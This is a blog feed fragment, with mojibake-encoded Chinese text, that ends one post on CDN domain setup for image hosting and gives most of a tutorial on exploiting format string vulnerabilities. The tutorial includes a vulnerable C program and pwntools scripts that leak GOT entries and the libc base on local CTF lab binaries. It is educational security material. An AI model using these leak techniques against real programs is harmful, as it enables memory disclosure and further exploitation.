id="ç»‘å®šåˆ›å»ºåŸŸå"><a href="#ç»‘å®šåˆ›å»ºåŸŸå" class="headerlink" title="ç»‘å®šåˆ›å»ºåŸŸå"></a>ç»‘å®šåˆ›å»ºåŸŸå</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/XxkzAY.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/sW0Ju4.png" srcset="/img/loading.gif" alt><br>xxxxä¹Ÿå°±æ˜¯å¡«ä½ çš„åŸŸåï¼Œå‰é¢çš„å¯ä»¥è‡ªå®šä¹‰ã€‚ç‚¹å‡»æ·»åŠ åä¸‹é¢æ€»æ˜¯ä¼šè‡ªåŠ¨åˆå¼¹å‡ºä¸€ä¸ªç©ºç™½çš„æ¡†ï¼Œç‚¹å‡»åé¢çš„åˆ é™¤ï¼Œå¦åˆ™ï¼Œå¾€ä¸‹æ»‘ä½ ä¼šå‘ç°å°±æ˜¯åˆ›å»ºä¸äº†è¿™ä¸ªè®°å½•ã€‚<br>åˆ›å»ºæˆåŠŸåï¼Œä¼šæç¤ºä½ å¤åˆ¶<strong>CNAME</strong>ï¼Œå¤åˆ¶ä¸€ä¸‹ï¼Œå»å¾€ä½ è‡ªå·±çš„åŸŸåç½‘ç«™ï¼Œæˆ‘ç”¨çš„æ˜¯é˜¿é‡Œäº‘ã€‚</p><h3 id="å»è‡ªå·±çš„dnsè§£æå¹³å°"><a href="#å»è‡ªå·±çš„dnsè§£æå¹³å°" class="headerlink" title="å»è‡ªå·±çš„dnsè§£æå¹³å°"></a>å»è‡ªå·±çš„dnsè§£æå¹³å°</h3><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/meWpeP.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œçš„ä¸»æœºè®°å½•å¡«å…¥åˆšåˆšä½ è‡ªå®šä¹‰çš„ä¸»æœºå¼€å¤´ï¼Œè®°å½•å€¼å¡«å…¥åˆšåˆšå¤åˆ¶çš„CNAMEï¼Œå°±å¯ä»¥äº†ã€‚</p><h3 id="ä¿®æ”¹upicè®¾ç½®"><a href="#ä¿®æ”¹upicè®¾ç½®" class="headerlink" title="ä¿®æ”¹upicè®¾ç½®"></a>ä¿®æ”¹upicè®¾ç½®</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/adszoz.png" srcset="/img/loading.gif" alt><br>å¡«å…¥å³å¯ï¼Œä»¥å‰å†™çš„åšå®¢ï¼Œå›¾ç‰‡çš„é“¾æ¥ä¹Ÿè¦æ”¹ä¸€ä¸‹ï¼Œå°±æ¢å¤åŸæ¥çš„æ ·å­äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ‚é¡¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰</title>
    <link href="/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•ä¸€ä¸‹ï¼Œåœ¨å­¦ä¹ è¿™ä¸ªæ¼æ´æ—¶å€™çš„è‡ªå·±æ„Ÿè§‰çš„ç–‘éš¾ç‚¹ï¼Œå’Œåšé¢˜æ—¶å€™çš„ä¸€ç‚¹å°æŠ€å·§ï¼Œè¿™ä¸€ç¯‡ä¸»è¦æ˜¯è®°å½•ç†è®ºã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><p>åŸºæœ¬æ ¼å¼ï¼š</p><div class="hljs"><pre><code class="hljs c">%[parameter][flags][field width][.precision][length]type</code></pre></div><p>éœ€è¦é‡ç‚¹å…³æ³¨çš„patternï¼š</p><ol><li>parameter ï¼šn$ï¼Œè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•°</li><li>field width ï¼šè¾“å‡ºçš„æœ€å°å®½åº¦</li><li>precision ï¼šè¾“å‡ºçš„æœ€å¤§é•¿åº¦</li><li>lengthï¼Œè¾“å‡ºçš„é•¿åº¦ : <code>hhï¼Œ1-byte ï¼› hï¼Œ2-byte ï¼› l, 4-byte ï¼›ll,8-byte ï¼›</code></li><li>type :<div class="hljs"><pre><code class="hljs c">d/iï¼Œæœ‰ç¬¦å·æ•´æ•°uï¼Œæ— ç¬¦å·æ•´æ•°x/Xï¼Œ<span class="hljs-number">16</span> è¿›åˆ¶ <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ã€‚x ä½¿ç”¨å°å†™å­—æ¯ï¼›X ä½¿ç”¨å¤§å†™å­—æ¯.sï¼Œè¾“å‡ºä»¥null ç»“å°¾å­—ç¬¦ä¸²ç›´åˆ°ç²¾åº¦è§„å®šçš„ä¸Šé™ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šç²¾åº¦ï¼Œåˆ™è¾“å‡ºæ‰€æœ‰å­—èŠ‚ã€‚cï¼ŒæŠŠ <span class="hljs-keyword">int</span> å‚æ•°è½¬ä¸º <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> å‹è¾“å‡ºpï¼Œ <span class="hljs-keyword">void</span> * å‹ï¼Œè¾“å‡ºå¯¹åº”å˜é‡çš„å€¼ã€‚<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%p"</span>,a) ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡ a çš„å€¼ï¼Œ<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%p"</span>, &amp;a) æ‰“å°å˜é‡ a æ‰€åœ¨çš„åœ°å€ã€‚nï¼Œä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚ï¼ˆä»…ä»…æ˜¯åœ¨è¿™ä¸€ä¸ª<span class="hljs-built_in">printf</span>çš„å‡½æ•°ï¼‰%ï¼Œ <span class="hljs-string">'%'</span>å­—é¢å€¼ï¼Œä¸æ¥å—ä»»ä½• flags, widthã€‚</code></pre></div></li></ol><p>å‚æ•°ï¼šå°±æ˜¯æ˜¯è¦å¯¹åº”è¾“å‡ºçš„å˜é‡ã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ¥è¿›è¡Œè§£æçš„ã€‚é‚£ä¹ˆç›¸åº”çš„è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ä¹Ÿè‡ªç„¶æ˜¯ç”±è¿™ä¸ª<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong>æ‰€æ§åˆ¶ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/PnScRI.png" srcset="/img/loading.gif" alt></p><p>æ ¹æ® <strong>cdecl çš„è°ƒç”¨çº¦å®š</strong>,åœ¨è¿›å…¥ printf()  å‡½æ•°ä¹‹å‰,å°†å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹æ ˆã€‚è¿›å…¥printf()  ä¹‹å,å‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°,ä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœå­—ç¬¦ä¸æ˜¯    % ,å­—ç¬¦ç›´æ¥å¤åˆ¶åˆ°è¾“å‡ºä¸­ã€‚å¦åˆ™,è¯»å–ä¸‹ä¸€ä¸ªéç©ºå­—ç¬¦,è·å–ç›¸åº”çš„å‚æ•°å¹¶è§£æè¾“å‡ºã€‚<br>å¦‚ä¸Šå›¾ä¸€æ ·ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ä¸åé¢å®é™…æä¾›çš„æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå°±ä¸ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤šåŠ å‡ ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„æ—¶å€™ï¼Œç¨‹åºä¼šæ€ä¹ˆåŠå‘¢ï¼Ÿ<strong>æ­¤æ—¶å…¶å¯ä»¥æ­£å¸¸é€šè¿‡ç¼–è¯‘ï¼Œå¹¶ä¸”åœ¨æ ˆä¸Šå–å€¼ï¼ŒæŒ‰ç…§ç»™çš„æ ¼å¼åŒ–å­—ç¬¦æ¥è§£æå¯¹åº”æ ˆä¸Šçš„å€¼ã€‚æ­¤æ—¶ä¹Ÿå°±å‘ç”Ÿäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</strong></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="æ³„éœ²å†…å­˜æ•°æ®"><a href="#æ³„éœ²å†…å­˜æ•°æ®" class="headerlink" title="æ³„éœ²å†…å­˜æ•°æ®"></a>æ³„éœ²å†…å­˜æ•°æ®</h3><h4 id="æ ˆä¸Šçš„æ•°æ®"><a href="#æ ˆä¸Šçš„æ•°æ®" class="headerlink" title="æ ˆä¸Šçš„æ•°æ®"></a>æ ˆä¸Šçš„æ•°æ®</h4><ol><li>åˆ©ç”¨ % order $ p / % order x æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”æ ˆçš„å†…å­˜å€¼ ã€‚(å¸¸ç”¨%p)</li><li>åˆ©ç”¨ % order $ s æ¥è·å–æŒ‡å®šå˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡æœ‰é›¶æˆªæ–­ã€‚(è¿™ä¸ªåœ¨åšæŸäº›ctfé¢˜å¾ˆå¥½ç”¨ï¼Œå½“ä¸€ä¸ªç¨‹åºä¸Šæ¥è¯»å–ä¸€ä¸ªflagåˆ°ä¸€ä¸ªä½ç½®ï¼Œç„¶åä½ åœ¨æ ˆä¸Šæ„é€ è¿™ä¸ªä½ç½®ï¼Œç›´æ¥%så°±å‡ºæ¥flagäº†ã€‚)<h4 id="ä»»æ„åœ°å€å†…å­˜"><a href="#ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="ä»»æ„åœ°å€å†…å­˜"></a>ä»»æ„åœ°å€å†…å­˜</h4>å½“æƒ³æ³„éœ²ä»»æ„åœ°å€å†…å­˜çš„æ—¶å€™ï¼Œå°±éœ€è¦<strong>æƒ³åŠæ³•æŠŠåœ°å€å†™å…¥æ ˆä¸­</strong>ã€‚<br>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹Ÿæ˜¯å­˜åœ¨æ ˆä¸Šçš„ï¼Œå½“å¯æ§çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥æŠŠæŸä¸ªåœ°å€å†™åˆ°è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸Šï¼Œç„¶åæ‰¾ä¸‹åœ¨è¿™ä¸ªprintfå‡½æ•°ä¸­<strong>å¯¹åº”çš„æ ˆåç§»</strong>ï¼Œç„¶ååœ¨ç”¨ä½ æƒ³ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ï¼ˆ%p/%x/%sï¼‰æ¥æ“ä½œå³å¯ã€‚ç„¶ååœ¨è¿™ä¸ªåœ°æ–¹ï¼Œå…¶æœ‰ä¸ªéš¾ç‚¹å°±æ˜¯<strong>æ‰¾å¯¹åº”çš„æ ˆåç§»</strong>ã€‚åœ¨æˆ‘ä»¬å®é™…ç”¨çš„æ—¶å€™ï¼Œå…¶å®å°±æ˜¯æ‰¾æ ˆä¸Šçš„æŸä¸ªä½ç½®å¯¹åº”è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ï¼Œå¹¶ä¸”ä¹Ÿåˆ†ä¸º32ä½äº64ä½ï¼Œå› ä¸ºå…¶ä¼ å‚æ˜¯ä¸ä¸€æ ·çš„ã€‚<h5 id="ç¡®å®šåç§»"><a href="#ç¡®å®šåç§»" class="headerlink" title="ç¡®å®šåç§»"></a>ç¡®å®šåç§»</h5><h6 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h6></li></ol><p><img src="http://qiqianyun.chumen77.xyz/uPic/jYXCSU.png" srcset="/img/loading.gif" alt><br>è¿™æ˜¯32ä½çš„æ ˆå¯¹åº”æƒ…å†µï¼Œæ˜¯æ¯”è¾ƒå¥½ç†è§£çš„ã€‚å¦‚å›¾ï¼Œå¹¶ä¸”å‘ç°è¿™äº›æŒ‡å®šå‚æ•°çš„ï¼ˆå¦‚%4$x),å…¶å°±æ˜¯å¯¹åº”æ‰¾å¯¹åº”æ ˆä¸Šå†…å®¹ ï¼Œè€Œä¸æŒ‡å®šçš„%xå…¶æ‰¾å¯»æ‰¾çš„æ—¶å€™ï¼Œæ˜¯çœ‹ä¸‹å‰é¢æœ‰ä¸ªå‡ ä¸ªå¯¹åº”çš„æ— æŒ‡å®šæ ¼å¼åŒ–å­—ç¬¦ï¼Œå°±æƒ³å›¾ä¸Šçš„æƒ…å†µï¼Œå†ç»™ä¸€ä¸ª%xå…¶æ˜¯ä¼šæ‰¾åˆ°arg4ã€‚</p><h6 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h6><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/KzxXZK.png" srcset="/img/loading.gif" alt><br>å› ä¸º64ä½çš„å‚æ•°å­˜æ”¾æ˜¯ä¼˜å…ˆå¯„å­˜å™¨(rdi,rsi,rdx,rcx,r8,r9)ï¼Œå æ»¡ä»¥åç¬¬7ä¸ªå‚æ•°æ‰ä¼šå­˜æ”¾åœ¨æ ˆä¸Šã€‚è¿™å°±æ˜¯è·Ÿ32ä½æ‰¾åç§»ä¸åŒåœ°æ–¹ã€‚</p><h6 id="å°æŠ€å·§"><a href="#å°æŠ€å·§" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h6><p>å¯ä»¥ç»™gdbå®‰è£…ä¸€ä¸‹pwndbgï¼Œåœ¨GitHubä¸Šé¢æ‰¾çš„åˆ°ã€‚ç„¶åæ¼”ç¤ºä¸€ä¸‹ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;        setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];        read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">99</span>);        <span class="hljs-built_in">printf</span>(buf);&#125;</code></pre></div><p>gdbè°ƒè¯•ï¼Œæ‰¾å›¾ä¸­æ¡†æ¡†çš„æ ˆåœ°å€ï¼Œå¯¹åº”çš„åç§»ï¼š<br>32ä½ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MCYXvC.png" srcset="/img/loading.gif" alt><br>64ä½ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/M6uXrw.png" srcset="/img/loading.gif" alt></p><p>æ³¨æ„æ˜¯å¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚ç”¨pwndbgçš„fmtargç¡®å®šåç§»ï¼Œå°±ä¸ç”¨æ‹…å¿ƒæ•°é”™äº†ã€‚</p><h5 id="å†™åœ°å€è¿›æ ˆ"><a href="#å†™åœ°å€è¿›æ ˆ" class="headerlink" title="å†™åœ°å€è¿›æ ˆ"></a>å†™åœ°å€è¿›æ ˆ</h5><p>å­¦ä¼šç¡®å®šåç§»åï¼Œå°±å¯ä»¥å†™åœ°å€è¿›æ ˆï¼Œæ¥å®ç°è¯»ä»»æ„åœ°å€å†…å­˜äº†ã€‚ç»å¸¸ä½¿ç”¨çš„æ˜¯ï¼Œ<strong>æŠŠè¿™ä¸ªç¨‹åºä¸­çš„æŸä¸ªgotåœ°å€å†™è¿›æ ˆï¼Œç„¶åå°±å¯ä»¥äº†æ¥è·å–å…¶å†…å®¹ï¼Œç„¶ååœ¨æ ¹æ®å…¶åœ¨libcä¸­çš„åç§»å°±å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºå€ï¼Œè¿›è€Œç®—å‡ºä»»æ„ä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼ˆå¦‚systemï¼‰</strong>ã€‚</p><h6 id="32ä½ï¼š"><a href="#32ä½ï¼š" class="headerlink" title="32ä½ï¼š"></a>32ä½ï¼š</h6><p>æ ¼å¼ï¼š<code>&lt;address&gt;%&lt;order&gt;$s</code><br>è¿™æ ·å°±å¯ä»¥å°è¯•è¯»å‡ºï¼Œadresså¤„å¯¹åº”çš„å€¼ï¼Œä½†æ˜¯å› ä¸ºæ˜¯%sï¼Œå…¶é‡åˆ°\x00å°±ä¼šç›´æ¥æ–­äº†ï¼Œæ²¡æœ‰æƒ³è¦çš„è¾“å‡ºã€‚æ›´å¸¸æœ‰çš„æƒ…å†µå°±æ˜¯ï¼Œä¼šè¾“å‡ºä¸€å¤§å †ï¼Œç„¶åæˆ‘ä»¬æƒ³è¦çš„åœ°å€æºæ‚åœ¨é‡Œé¢ï¼Œæ‰€ä»¥å¯ä»¥æ”¹è¿›ä¸€ä¸‹ï¼Œå¯ä»¥åŠ ä¸€ç»„æ ‡è®°ï¼Œç„¶åå†å»å–å‡ºæ¥æƒ³è¦ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥æ¥æ£€æµ‹æ˜¯å¦è¢«\x00æˆªæ–­äº†ã€‚<br>æ”¹è¿›æ ¼å¼ï¼š<code>&lt;address&gt;@@%&lt;order&gt;$s@@</code><br>åœ¨ä½¿ç”¨çš„æ—¶å€™è®°å¾—é™¤å» <strong>&lt; &gt;</strong>ã€‚<br>å®ä¾‹ï¼š</p><div class="hljs"><pre><code class="hljs c">gdb-peda$ got/media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE<span class="hljs-number">08049f</span>fc R_386_GLOB_DAT    __gmon_start__<span class="hljs-number">0804</span>a028 R_386_COPY        <span class="hljs-built_in">stdout</span>@@GLIBC_2<span class="hljs-number">.0</span><span class="hljs-number">0804</span>a00c R_386_JUMP_SLOT   read@GLIBC_2<span class="hljs-number">.0</span><span class="hljs-number">0804</span>a010 R_386_JUMP_SLOT   <span class="hljs-built_in">printf</span>@GLIBC_2<span class="hljs-number">.0</span><span class="hljs-number">0804</span>a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2<span class="hljs-number">.4</span><span class="hljs-number">0804</span>a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2<span class="hljs-number">.0</span><span class="hljs-number">0804</span>a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2<span class="hljs-number">.0</span></code></pre></div><p>è·å–ä¸€ä¸‹gotï¼Œé€‰æ‹©read ï¼š 0x0804a00c ,ç„¶åå€ŸåŠ©pwntoolsï¼š</p><div class="hljs"><pre><code class="hljs c">from pwn import *context.log_level = 'debug'io = process('./test')payload = p32(0x0804a00c) + '@@%6$s@@'# raw_input('-&gt;')io.sendline(payload)io.recvuntil('@@')print('leak-&gt;' +hex(u32(io.recv(4))))io.interactive()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/BP69HU.png" srcset="/img/loading.gif" alt><br>å‘ç°å‡ºç°äº†å¼‚å¸¸ã€‚<br>ä¿®æ”¹ä»£ç ï¼ŒæŸ¥ä¸€ä¸‹readåœ¨libcçš„symbolsï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./test'</span>)elf = ELF(<span class="hljs-string">'./test'</span>)libc = elf.libcpayload = p32(<span class="hljs-number">0x0804a00c</span>) + <span class="hljs-string">'@@%6$s@@'</span><span class="hljs-comment"># raw_input('-&gt;')</span>io.sendline(payload)io.recvuntil(<span class="hljs-string">'@@'</span>)print(<span class="hljs-string">'leak-&gt;'</span> +hex(u32(io.recv(<span class="hljs-number">4</span>))))print(<span class="hljs-string">'read-libc.symbols-&gt;'</span> + hex(libc.symbols[<span class="hljs-string">'read'</span>]))io.interactive()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/B6kI8x.png" srcset="/img/loading.gif" alt><br>å‘ç°å°±æ˜¯å› ä¸ºè¿æ°”ä¸å¥½ï¼Œè¿™ä¸ªlibcç‰ˆæœ¬é‡Œæ­£å¥½readå‡½æ•°æ˜¯00ç»“å°¾çš„ï¼Œæ‰€ä»¥æ¢ä¸€ä¸‹:<br>Printf : 0x0804a010<br><img src="http://qiqianyun.chumen77.xyz/uPic/HwQRgy.png" srcset="/img/loading.gif" alt><br>è¿™å°±å¯ä»¥äº†ï¼Œå¹¶ä¸”è¿˜å¯ä»¥çœ‹å‡ºæ¥çš„ç¡®æ˜¯è¾“å‡ºæ¥ä¸€å †ä¸œè¥¿ã€‚</p><h6 id="64ä½-1"><a href="#64ä½-1" class="headerlink" title="64ä½"></a>64ä½</h6><p>åœ¨64ä½ç¨‹åºå½“ä¸­ï¼Œä¸€ä¸ªåœ°å€çš„é«˜ä½å¿…å®šå°±æ˜¯0ï¼Œæ‰€ä»¥<strong>addressæ˜¯ä¸èƒ½å†™åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æœ€å‰é¢çš„</strong>ï¼Œå¯ä»¥è·Ÿåœ¨fmtåé¢ï¼Œä½†æ˜¯è¿™é‡Œå°±ç‰µæ¶‰åˆ°äº†å­—èŠ‚å¯¹é½é—®é¢˜ï¼Œå¹¶ä¸”å…¶åç§»é‡ç®—èµ·æ¥ï¼Œå½“æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åšpaddingæ—¶ï¼Œåç§»é‡æ—¶ä¼šå› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦è€Œå‘ç”Ÿå˜åŒ–çš„ã€‚æ‰€ä»¥è¾ƒå¥½çš„åšæ³•ï¼Œ<strong>å°±æ˜¯åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤„åšå¥½paddingï¼Œè¿™æ ·è§£å†³äº†å­—èŠ‚å¯¹é½ï¼Œä¹Ÿè§£å†³äº†åç§»é‡çš„è®¡ç®—ã€‚</strong><br>å®ä¾‹ï¼šï¼ˆè¿˜æ˜¯åˆšåˆšçš„ç¨‹åºç¼–è¯‘æˆ64ä½ï¼‰</p><div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">'@@%6$s@@'</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">'a'</span>) + p64(<span class="hljs-number">0x000000601020</span>)</code></pre></div><p>è¿™æ¬¡æŠŠpayloadè¿™æ ·å†™ï¼Œåšå¥½paddingï¼ŒæŠŠaddresså†™åœ¨åé¢ï¼Œæ­¤æ—¶å› ä¸ºåç§»ä¼šå˜ï¼Œgdbè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ï¼Œåç§»å˜ä¸ºå¤šå°‘ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/t6RmMP.png" srcset="/img/loading.gif" alt><br>å¯ä»¥çœ‹å‡ºæ¥åç§»ä¸º11ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/03RQ1J.png" srcset="/img/loading.gif" alt><br>å‘ç°å†æ¬¡è¿æ°”ä¸å¥½ï¼Œè¿˜æ˜¯å¾—æ¢ä¸€ä¸ªå‡½æ•°æ‰“å°gotï¼Œæ¢æˆreadï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./test3'</span>)elf = ELF(<span class="hljs-string">'./test3'</span>)libc = elf.libcpayload = <span class="hljs-string">'@@%11$s@@'</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">'a'</span>) + p64(<span class="hljs-number">0x000000601028</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'@@'</span>)print(<span class="hljs-string">'leak-&gt;'</span> +hex(u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))))print(<span class="hljs-string">'read-libc.symbols-&gt;'</span> + hex(libc.symbols[<span class="hljs-string">'read'</span>]))io.interactive()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/mH8zy0.png" srcset="/img/loading.gif" alt><br>è¿™æ ·å°±OKäº†ã€‚</p><h5 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h5><ol><li>ä½¿ç”¨%s è¯»å–å†…å­˜é‡Œçš„ä»»æ„ä½å€ï¼Œ%s ä¼šæŠŠå¯¹åº”çš„å‚æ•°å½“åš <code>char*</code>æŒ‡æ ‡å¹¶å°†ç›®æ ‡åšä¸ºå­—ç¬¦ä¸²å°å‡ºæ¥</li><li>ä½¿ç”¨é™åˆ¶:Stack ä¸Šè¦æœ‰å¯æ§åˆ¶ addres çš„buffer ;æ³¨æ„ç”±äºæ˜¯å½“åšå­—ç¬¦ä¸²æ‰“å°ï¼Œæ‰€ä»¥åˆ° 0 æ—¶å°±ä¼šä¸­æ–­,ä¹Ÿè¦æ³¨æ„32ä½è·Ÿ64ä½addressçš„å†™åœ¨çš„ä½ç½®ã€‚<h5 id="å°æŠ€å·§-1"><a href="#å°æŠ€å·§-1" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h5><h6 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h6>æƒ³è¦æ³„éœ²libcåŸºå€ï¼Œè¿˜æœ‰å°±æ˜¯é€šè¿‡è¿”å›<code>__libc_start_main + x</code>(libcç‰ˆæœ¬ä¸ä¸€æ ·å¯èƒ½ä¼šä¸ä¸€æ ·ï¼Œæœ¬äººæ˜¯ubuntu16.04)<br><img src="http://qiqianyun.chumen77.xyz/uPic/IFdTkV.png" srcset="/img/loading.gif" alt><br>ç®—ä¸€ä¸‹åç§»æ˜¯21ã€‚<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./test3'</span>)elf = ELF(<span class="hljs-string">'./test3'</span>)libc = elf.libcpayload = <span class="hljs-string">'%21$p'</span>.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">'a'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'0x'</span>)libc_base = int(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">240</span> - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]print(<span class="hljs-string">'leak-&gt;'</span> +hex(libc_base))io.interactive()</code></pre></div></li></ol><p>è¿è¡Œè¿™ä¸ªexpæ¥leak libcçš„åŸºå€ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsG4Nl.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/R9cYuX.png" srcset="/img/loading.gif" alt><br>æˆåŠŸäº†ã€‚</p><h6 id="0x2"><a href="#0x2" class="headerlink" 